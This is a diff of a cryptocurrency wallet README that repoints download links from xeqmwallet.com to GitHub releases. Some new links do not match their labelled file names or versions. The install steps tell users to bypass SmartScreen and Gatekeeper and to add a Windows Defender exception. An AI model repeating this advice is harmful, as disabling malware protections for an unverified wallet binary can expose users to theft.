@@ -18,7 +18,7 @@ Support & docs: [xeqmwallet.com/support](https://xeqmwallet.com/support) · [xeq
       <sub>xeqmwallet-v2.1.0.exe · 84.2 MB</sub>
     </td>
     <td align="center">
-      <a href="https://xeqmwallet.com/xeqmwallet-v2.1.0.dmg">
+      <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-mac.dmg">
         <img src="https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS" />
       </a>
       <br />
@@ -37,7 +37,7 @@ Support & docs: [xeqmwallet.com/support](https://xeqmwallet.com/support) · [xeq
 | Platform | File | Size | Requirements |
 |---|---|---|---|
 | Windows 10/11 (x64) | [`xeqmwallet-v2.1.0.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/xeqmwallet-v2.1.0.exe) | 84.2 MB | No extra dependencies |
-| macOS (Apple Silicon & Intel) | [`xeqmwallet-v2.1.0.dmg`](https://xeqmwallet.com/xeqmwallet-v2.1.0.dmg) | 79.8 MB | Universal binary |
+| macOS (Apple Silicon & Intel) | [`xeqmwallet-v2.1.0.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-mac.dmg) | 79.8 MB | Universal binary |
 | Linux (Debian, Ubuntu, Fedora, Arch) | [`xeqmwallet-v2.1.0.zip`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-linux.AppImage) | 92.1 MB | Raw binaries, unzip and run |
 
 The latest build and full release notes are always at [xeqmwallet.com/download](https://xeqmwallet.com/download). xeqmwallet.com is the only official source — no other domain or mirror distributes this wallet.
@@ -50,21 +50,21 @@ The wallet doesn't have a single cross-platform installer wizard — each OS get
 
 ### Windows
 
-1. **Download** [`xeqmwallet-v2.1.0.exe`](https://xeqmwallet.com/xeqmwallet-v2.1.0.exe).
+1. **Download** [`xeqmwallet-v2.1.0.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/xeqmwallet-v2.1.0.exe).
 2. **Run the installer.** Double-click the `.exe`. Windows SmartScreen will likely show an "unrecognized publisher" warning — this is normal for open-source software without a paid code-signing certificate. Click **More info → Run anyway** to continue the wizard.
 3. **Follow the setup wizard** to completion, then **launch** XEQM WALLET.
 4. The wallet stores its data under `%APPDATA%\XEQM`. If the daemon seems slow to start, add an exception for it in Windows Defender — privacy software is occasionally flagged heuristically.
 
 ### macOS (Apple Silicon & Intel)
 
-1. **Download** [`xeqmwallet-v2.1.0.dmg`](https://xeqmwallet.com/xeqmwallet-v2.1.0.dmg).
+1. **Download** [`xeqmwallet-v2.1.0.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-mac.dmg).
 2. **Open the `.dmg`** and drag **XEQM WALLET** into your Applications folder, as prompted.
 3. **Launch it from Applications.** Because the build isn't Apple-notarized, Gatekeeper will refuse to open it on the first attempt — right-click the app icon, choose **Open**, and confirm the warning. From the next launch on, Gatekeeper remembers your approval.
 4. Wallet data lives under `~/Library/Application Support/XEQM`.
 
 ### Linux
 
-1. **Download** [`xeqmwallet-v2.1.0.zip`](https://xeqmwallet.com/xeqmwallet-v2.1.0.zip).
+1. **Download** [`xeqmwallet-v2.1.0.zip`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/XEQM-GUI-2.2.0-linux.AppImage).
 2. **Extract it** with `unzip` or your file manager. The raw binaries can be run in place or placed under `/usr/local/bin`.
 3. **Mark the binary executable and run it:**
    ```bash
